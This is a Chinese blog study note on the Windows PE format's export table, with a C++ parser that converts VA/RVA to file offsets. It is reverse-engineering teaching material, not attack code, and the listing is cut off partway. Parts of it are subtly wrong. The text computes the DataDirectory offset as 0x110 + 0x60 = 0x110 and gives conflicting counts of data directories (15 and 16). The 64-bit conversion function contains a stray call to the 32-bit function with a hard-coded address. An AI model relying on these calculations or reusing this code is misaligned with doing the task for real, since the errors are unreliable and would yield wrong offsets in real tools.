<img src="/images/PE结构-VA与FOA的转化.assets/image-20211014162356982.png" alt="image-20211014162356982" style="zoom:200%;">

<p>本文复现学习自52pojie.cn论坛的lyl610abc师傅PE文件笔记。</p>
<p>原文连接：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.52pojie.cn/thread-1412395-1-1.html</span><br></pre></td></tr></table></figure>


      
    </div>
    
    <div class="article-info article-info-index">
      
      

      
    <div class="article-tag tagcloud">
        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/PE%E7%BB%93%E6%9E%84/" rel="tag">PE结构</a></li></ul>
    </div>

      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>











  
    <article id="post-PE结构-导出表(3)" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a  href="/2021/10/14/PE%E7%BB%93%E6%9E%84-%E5%AF%BC%E5%87%BA%E8%A1%A8(3)/" class="article-date">
      <time datetime="2021-10-14T03:07:55.000Z" itemprop="datePublished">2021-10-14</time>
</a>

    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a  class="article-title" href="/2021/10/14/PE%E7%BB%93%E6%9E%84-%E5%AF%BC%E5%87%BA%E8%A1%A8(3)/">PE结构-导出表(3)</a>
    </h1>
  


      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
          
        <h1 id="导出表"><a href="#导出表" class="headerlink" title="导出表"></a><strong>导出表</strong></h1><h4 id="导出表的作用"><a href="#导出表的作用" class="headerlink" title="导出表的作用"></a><strong>导出表的作用</strong></h4><p>一个可执行程序是由<strong>多个PE文件</strong>构成的</p>
<p>利用EverEdit.exe为例，查看运行他所需的所有模块</p>
<p>使用od载入程序，利用<em>e</em>查看载入的模块（dll与exe程序，PE文件载入内存后可称作模块）</p>
<p><img src="/images/PE%E7%BB%93%E6%9E%84-%E5%AF%BC%E5%87%BA%E8%A1%A8%EF%BC%883%EF%BC%89.assets/image-20211015112208833.png" alt="image-20211015112208833"></p>
<p>我们可以看出，该程序除了载入自身exe程序外，还在外部动态链接了大量dll文件，这些dll为程序提供了运行所需的一些函数</p>
<p>就比如MessageBoxA的弹窗函数就是由User32.dll模块提供</p>
<p>以上的每个模块都发挥着其作用，使得程序得以正常运行</p>
<p>一个程序引用哪些模块是由<strong>其导入表</strong>决定的</p>
<p>与导入表相对应的便是<strong>导出表</strong>，导出表则是决定当前PE文件<strong>能给其他PE文件提供的函数</strong></p>
<p>拿User32.dll举例，它的导出表结构中，一定包含着MessageBoxA这个函数,否则它不可能提供这个函数给程序。</p>
<hr>
<p><strong>导入表与导出表概念总结</strong>:</p>
<ul>
<li>导出表:设置本PE文件可以将什么函数提供给其他PE文件</li>
<li>导入表:该PE文件可以使用哪些PE文件。</li>
</ul>
<p><strong>个人理解</strong>，PE文件中的导入表像是C/C++中的#include <xxx> 包含另一个文件来使用其中的函数，导出表便是其头文件，可使用的函数便是头文件中所声明的函数那般。</xxx></p>
<h2 id="何为导出表？"><a href="#何为导出表？" class="headerlink" title="何为导出表？"></a>何为导出表？</h2><p>导出表便是记录该PE文件提供给其他PE文件的函数的一种结构</p>
<h3 id="定位导出表"><a href="#定位导出表" class="headerlink" title="定位导出表"></a>定位导出表</h3><h4 id="定位导出表的原理"><a href="#定位导出表的原理" class="headerlink" title="定位导出表的原理"></a>定位导出表的原理</h4><p>导出表的定位可以利用PE文件_IMAGE_OPTIONAL_HEADER32中的DataDirectory结构进行定位。</p>
<p>DataDirecoty是一个长为16的数组，<strong>每个数组成员对应一个表</strong></p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">成员										数据宽度</span><br><span class="line"></span><br><span class="line">DataDirectory[<span class="number">16</span>] 	IMAGE_DATA_DIRECTORY[<span class="number">16</span>]=<span class="number">128</span>字节</span><br></pre></td></tr></table></figure>

<p>数据目录中共有16个表</p>
<p>根据表的结构可知，导出表的下标为0</p>
<p>即DataDirectory[0]表示导出表</p>
<p><img src="/images/PE%E7%BB%93%E6%9E%84-%E5%AF%BC%E5%87%BA%E8%A1%A8%EF%BC%883%EF%BC%89.assets/image-20211014165215769.png" alt="image-20211014165215769"></p>
<p>根据c语言中，该成员在扩展PE头中的定义</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES];</span><br></pre></td></tr></table></figure>

<p>可以看到数组成员的结构为IMAGE_DATA_DIRECTORY</p>
<p><strong>IMAGE_DATA_DIRECTORY</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_DATA_DIRECTORY</span> &#123;</span></span><br><span class="line">    DWORD   VirtualAddress;</span><br><span class="line">    DWORD   Size;</span><br><span class="line">&#125; IMAGE_DATA_DIRECTORY, *PIMAGE_DATA_DIRECTORY;</span><br></pre></td></tr></table></figure>

<p>这样的结构于扩展PE头内有15个</p>
<table>
<thead>
<tr>
<th>IMAGE_DATA_DIRECTORY成员</th>
<th>数据宽度</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>VirtualAddress</td>
<td>DWORD(4字节)</td>
<td>表的起始位置（RVA）</td>
</tr>
<tr>
<td>Size</td>
<td>DWORD(4字节)</td>
<td>表的大小</td>
</tr>
</tbody></table>
<p>VirtualAddress 意为一个相对虚拟地址(RVA)</p>
<p>Size： 表的大小</p>
<p>根据VirtualAddress 与 Size 可求出该表的范围。</p>
<p>同时，IMAGE_DATA_DIRECTORY<strong>仅仅记录表的位置和大小，没有描述表的具体结构</strong></p>
<h4 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h4><p>1.找到IMAGE_OPTIONAL_HEADER32的最后一个成员DataDirectory</p>
<p>2.获取DataDirectory[0]</p>
<p>3.根据DataDirectory[0].virtualAddress得到导出表的RVA</p>
<p>4.将导出表的RVA转换为FOA，利用16进制编辑器定位导出表</p>
<p>RVA = 区块.VirtualAddress + 差值</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">### RVA 转 FOA 计算方式</span><br><span class="line"></span><br><span class="line">若RVA不在PE头内:</span><br><span class="line"></span><br><span class="line">差值 = RVA - 区块.VirtualAddress</span><br><span class="line"></span><br><span class="line">FOA = 区块.PointerToRawData + 差值</span><br><span class="line"></span><br><span class="line">若在PE头内:</span><br><span class="line"></span><br><span class="line">RVA = FOA</span><br></pre></td></tr></table></figure>

<p><strong>分析实例</strong></p>
<p>以lyl610abc师傅于文中公布的dll文件为例，进行调试</p>
<p>导出函数的声明定义</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">EXPORTS</span><br><span class="line">Add @<span class="number">12</span> </span><br><span class="line">Sub @<span class="number">15</span> NONAME</span><br><span class="line">Multiply @<span class="number">17</span></span><br><span class="line">Divide @<span class="number">10</span></span><br></pre></td></tr></table></figure>

<p>具体导出函数定义</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> _stdcall <span class="title">Add</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> x+y;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> _stdcall <span class="title">Sub</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> x-y;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> _stdcall <span class="title">Multiply</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> x * y;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> _stdcall <span class="title">Divide</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> x / y;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="找到DataDirectory"><a href="#找到DataDirectory" class="headerlink" title="找到DataDirectory"></a>找到DataDirectory</h4><p>由于DataDirectory数据目录本身在PE头的扩展头部分，因此我们需要先获取到PE头的起始位，再根据IMAGE_NT_HEADERS结构的PE文件头标志大小+标准PE头大小达到扩展PE头：</p>
<p><img src="/images/PE%E7%BB%93%E6%9E%84-%E5%AF%BC%E5%87%BA%E8%A1%A8%EF%BC%883%EF%BC%89.assets/image-20211014191938589.png" alt="image-20211014191938589"></p>
<p>演示DLL文件为PE32文件，因此PE格式的标准头文件为 IMAGE_NT_HEADERS：</p>
<p>扩展PE头首地址:0xF8+0x4+0x14(20) = 0x110</p>
<p><img src="/images/PE%E7%BB%93%E6%9E%84-%E5%AF%BC%E5%87%BA%E8%A1%A8%EF%BC%883%EF%BC%89.assets/image-20211014192704811.png" alt="image-20211014192704811"></p>
<p>同时扩展PE头大小为224 字节，数据目录(DATADirectory大小) = _IMAGE_DATA_DIRECTORY大小*16 = 8 *16 = 128</p>
<p>因此224 - 128 = 96个字节</p>
<p>因此扩展PE头起始地址+ 96字节后为DataDirectory结构的起始地址</p>
<p>DataDirectory起始地址 = 扩展头地址+ 0x60(96) = 0x110 + 0x60 = 0x110 </p>
<p><img src="/images/PE%E7%BB%93%E6%9E%84-%E5%AF%BC%E5%87%BA%E8%A1%A8%EF%BC%883%EF%BC%89.assets/image-20211014195234440.png" alt="image-20211014195234440"></p>
<p>由此拿到DataDirectory，顺序排放DataDirectory[0] ~ DataDirectory[15] 8字节一张表</p>
<p>DataDirectory[0] 对应着导出表</p>
<table>
<thead>
<tr>
<th>IMAGE_DATA_DIRECTORY成员</th>
<th>值</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>VirtualAddress</td>
<td>0x00018FB0</td>
<td>表的起始位置（RVA）</td>
</tr>
<tr>
<td>Size</td>
<td>0x00000190</td>
<td>表的大小</td>
</tr>
</tbody></table>
<h4 id="得到导出表的RVA"><a href="#得到导出表的RVA" class="headerlink" title="得到导出表的RVA"></a>得到导出表的RVA</h4><p>根据结构拿到导出表<strong>RVA</strong>值为: 0x018FB0</p>
<p>导出表的<strong>size</strong>为: 0x0190</p>
<h4 id="RVA转换FOA"><a href="#RVA转换FOA" class="headerlink" title="RVA转换FOA"></a><strong>RVA转换FOA</strong></h4><p>但是IMAGE_DATA_DIRECTORY中的VirtualAddress 是RVA它在内存中才有的用， 在磁盘文件下需要将其转换成FOA</p>
<p>直接利用代码获取对应的FOA:</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// PE.cpp : Defines the entry point for the console application.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;malloc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;winnt.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="comment">//在VC6这个比较旧的环境里，没有定义64位的这个宏，需要自己定义，在VS2019中无需自己定义</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_FILE_MACHINE_AMD64  0x8664</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//VA转FOA 32位</span></span><br><span class="line"><span class="comment">//第一个参数为要转换的在内存中的地址：VA</span></span><br><span class="line"><span class="comment">//第二个参数为指向dos头的指针</span></span><br><span class="line"><span class="comment">//第三个参数为指向nt头的指针</span></span><br><span class="line"><span class="comment">//第四个参数为存储指向节指针的数组</span></span><br><span class="line"><span class="function">UINT <span class="title">VaToFoa32</span><span class="params">(UINT va, _IMAGE_DOS_HEADER *dos,_IMAGE_NT_HEADERS* nt, _IMAGE_SECTION_HEADER** sectionArr)</span> </span>&#123;</span><br><span class="line">    <span class="comment">//得到RVA的值：RVA = VA - ImageBase</span></span><br><span class="line">    UINT rva = va - nt-&gt;OptionalHeader.ImageBase;</span><br><span class="line">    <span class="comment">//输出rva</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;rva:%X\n&quot;</span>, rva);</span><br><span class="line">    <span class="comment">//找到PE文件头后的地址 = PE文件头首地址+PE文件头大小</span></span><br><span class="line">    UINT PeEnd = (UINT)dos-&gt;e_lfanew+<span class="built_in"><span class="keyword">sizeof</span></span>(_IMAGE_NT_HEADERS);</span><br><span class="line">    <span class="comment">//输出PeEnd</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;PeEnd:%X\n&quot;</span>, PeEnd);</span><br><span class="line">    <span class="comment">//判断rva是否位于PE文件头中</span></span><br><span class="line">    <span class="keyword">if</span> (rva &lt; PeEnd) &#123;</span><br><span class="line">        <span class="comment">//如果rva位于PE文件头中，则foa==rva，直接返回rva即可</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;foa:%X\n&quot;</span>, rva);        </span><br><span class="line">        <span class="keyword">return</span> rva;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">//如果rva在PE文件头外</span></span><br><span class="line">        <span class="comment">//判断rva属于哪个节</span></span><br><span class="line">        <span class="keyword">int</span> i;</span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; nt-&gt;FileHeader.NumberOfSections; i++) &#123;</span><br><span class="line">            <span class="comment">//计算内存对齐后节的大小</span></span><br><span class="line">            UINT SizeInMemory = <span class="built_in">ceil</span>((<span class="keyword">double</span>)<span class="built_in">max</span>((UINT)sectionArr[i]-&gt;Misc.VirtualSize ,(UINT)sectionArr[i]-&gt;SizeOfRawData ) / (<span class="keyword">double</span>)nt-&gt;OptionalHeader.SectionAlignment)* nt-&gt;OptionalHeader.SectionAlignment;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (rva &gt;= sectionArr[i]-&gt;VirtualAddress &amp;&amp; rva &lt; (sectionArr[i]-&gt;VirtualAddress + SizeInMemory)) &#123;</span><br><span class="line">                <span class="comment">//找到所属的节</span></span><br><span class="line">                <span class="comment">//输出内存对齐后的节的大小</span></span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;SizeInMemory:%X\n&quot;</span>, SizeInMemory);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (i &gt;= nt-&gt;FileHeader.NumberOfSections) &#123;</span><br><span class="line">            <span class="comment">//未找到</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;没有找到匹配的节\n&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">//计算差值= RVA - 节.VirtualAddress</span></span><br><span class="line">            UINT offset = rva - sectionArr[i]-&gt;VirtualAddress;</span><br><span class="line">            <span class="comment">//FOA = 节.PointerToRawData + 差值</span></span><br><span class="line">            UINT foa = sectionArr[i]-&gt;PointerToRawData + offset;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;foa:%X\n&quot;</span>, foa);</span><br><span class="line">            <span class="keyword">return</span> foa;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//VA转FOA 64位</span></span><br><span class="line"><span class="comment">//第一个参数为要转换的在内存中的地址：VA</span></span><br><span class="line"><span class="comment">//第二个参数为指向dos头的指针</span></span><br><span class="line"><span class="comment">//第三个参数为指向nt头的指针</span></span><br><span class="line"><span class="comment">//第四个参数为存储指向节指针的数组</span></span><br><span class="line"><span class="function">UINT <span class="title">VaToFoa64</span><span class="params">(UINT va, _IMAGE_DOS_HEADER* dos, _IMAGE_NT_HEADERS64* nt, _IMAGE_SECTION_HEADER** sectionArr)</span> </span>&#123;</span><br><span class="line">    <span class="comment">//得到RVA的值：RVA = VA - ImageBase</span></span><br><span class="line">    UINT rva = va - nt-&gt;OptionalHeader.ImageBase;</span><br><span class="line">    <span class="comment">//输出rva</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;rva:%X\n&quot;</span>, rva);</span><br><span class="line">    <span class="comment">//找到PE文件头后的地址 = PE文件头首地址+PE文件头大小</span></span><br><span class="line">    UINT PeEnd = (UINT)dos-&gt;e_lfanew + <span class="built_in"><span class="keyword">sizeof</span></span>(_IMAGE_NT_HEADERS64);</span><br><span class="line">    <span class="comment">//输出PeEnd</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;PeEnd:%X\n&quot;</span>, PeEnd);</span><br><span class="line">    <span class="comment">//判断rva是否位于PE文件头中</span></span><br><span class="line">    <span class="keyword">if</span> (rva &lt; PeEnd) &#123;</span><br><span class="line">        <span class="comment">//如果rva位于PE文件头中，则foa==rva，直接返回rva即可</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;foa:%X\n&quot;</span>, rva);</span><br><span class="line">        <span class="keyword">return</span> rva;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">//如果rva在PE文件头外</span></span><br><span class="line">        <span class="comment">//判断rva属于哪个节</span></span><br><span class="line">        <span class="keyword">int</span> i;</span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; nt-&gt;FileHeader.NumberOfSections; i++) &#123;</span><br><span class="line">            <span class="comment">//计算内存对齐后节的大小</span></span><br><span class="line">            UINT SizeInMemory = <span class="built_in">ceil</span>((<span class="keyword">double</span>)<span class="built_in">max</span>((UINT)sectionArr[i]-&gt;Misc.VirtualSize ,(UINT)sectionArr[i]-&gt;SizeOfRawData ) / (<span class="keyword">double</span>)nt-&gt;OptionalHeader.SectionAlignment)* nt-&gt;OptionalHeader.SectionAlignment;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (rva &gt;= sectionArr[i]-&gt;VirtualAddress &amp;&amp; rva &lt; (sectionArr[i]-&gt;VirtualAddress + SizeInMemory)) &#123;</span><br><span class="line">                <span class="comment">//找到所属的节</span></span><br><span class="line">                <span class="comment">//输出内存对齐后的节的大小</span></span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;SizeInMemory:%X\n&quot;</span>, SizeInMemory);</span><br><span class="line">				<span class="built_in">VaToFoa32</span>(nt-&gt;OptionalHeader.ImageBase +<span class="number">0x18FB0</span>,dos,(_IMAGE_NT_HEADERS*)nt,sectionArr);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (i &gt;= nt-&gt;FileHeader.NumberOfSections) &#123;</span><br><span class="line">            <span class="comment">//未找到</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;没有找到匹配的节\n&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">//计算差值= RVA - 节.VirtualAddress</span></span><br><span class="line">            <span class="keyword">int</span> offset = rva - sectionArr[i]-&gt;VirtualAddress;</span><br><span class="line">            <span class="comment">//FOA = 节.PointerToRawData + 差值</span></span><br><span class="line">            <span class="keyword">int</span> foa = sectionArr[i]-&gt;PointerToRawData + offset;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;foa:%X\n&quot;</span>, foa);</span><br><span class="line">            <span class="keyword">return</span> foa;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//创建DOS对应的结构体指针</span></span><br><span class="line">    _IMAGE_DOS_HEADER* dos;</span><br><span class="line">    <span class="comment">//读取文件，返回文件句柄</span></span><br><span class="line">    HANDLE hFile = <span class="built_in">CreateFileA</span>(<span class="string">&quot;C:\\Users\\86156\\Desktop\\mydll.dll&quot;</span>, GENERIC_READ, FILE_SHARE_READ, <span class="literal">NULL</span>, OPEN_EXISTING, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="comment">//根据文件句柄创建映射</span></span><br><span class="line">    HANDLE hMap = <span class="built_in">CreateFileMappingA</span>(hFile, <span class="literal">NULL</span>, PAGE_READONLY, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="comment">//映射内容</span></span><br><span class="line">    LPVOID pFile = <span class="built_in">MapViewOfFile</span>(hMap, FILE_MAP_READ, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="comment">//类型转换，用结构体的方式来读取</span></span><br><span class="line">    dos = (_IMAGE_DOS_HEADER*)pFile;</span><br><span class="line">    <span class="comment">//输出dos-&gt;e_magic，以十六进制输出</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;dos-&gt;e_magic:%X\n&quot;</span>, dos-&gt;e_magic);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//创建指向PE文件头标志的指针</span></span><br><span class="line">    DWORD* peId;</span><br><span class="line">    <span class="comment">//让PE文件头标志指针指向其对应的地址=DOS首地址+偏移</span></span><br><span class="line">    peId = (DWORD*)((UINT)dos + dos-&gt;e_lfanew);</span><br><span class="line">    <span class="comment">//输出PE文件头标志，其值应为4550，否则不是PE文件</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;peId:%X\n&quot;</span>, *peId);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//创建指向可选PE头的第一个成员magic的指针</span></span><br><span class="line">    WORD* magic;</span><br><span class="line">    <span class="comment">//让magic指针指向其对应的地址=PE文件头标志地址+PE文件头标志大小+标准PE头大小</span></span><br><span class="line">    magic = (WORD*)((UINT)peId + <span class="built_in"><span class="keyword">sizeof</span></span>(DWORD) + <span class="built_in"><span class="keyword">sizeof</span></span>(_IMAGE_FILE_HEADER));</span><br><span class="line">    <span class="comment">//输出magic，其值为0x10b代表32位程序，其值为0x20b代表64位程序</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;magic:%X\n&quot;</span>, *magic);</span><br><span class="line">    <span class="comment">//根据magic判断为32位程序还是64位程序</span></span><br><span class="line">    <span class="built_in"><span class="keyword">switch</span></span> (*magic) &#123;</span><br><span class="line">    <span class="keyword">case</span> IMAGE_NT_OPTIONAL_HDR32_MAGIC:</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;32位程序\n&quot;</span>);</span><br><span class="line">        <span 